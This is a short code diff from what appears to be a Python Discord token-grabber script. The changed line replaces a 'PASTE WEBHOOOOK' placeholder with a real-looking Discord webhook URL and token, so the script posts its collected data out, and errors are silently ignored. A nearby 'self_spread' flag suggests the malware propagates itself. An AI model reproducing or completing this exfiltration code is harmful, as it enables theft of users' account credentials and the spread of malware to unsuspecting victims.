@@ -230,7 +230,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("PASTE WEBHOOOOK", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/1347014269916414052/JnNhVeU2yHkC2xSuoLMM4jmiIx3QJx27M9pNyUJ_6LGsZPU8hBPtRfDWrUzsAcC4262M", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
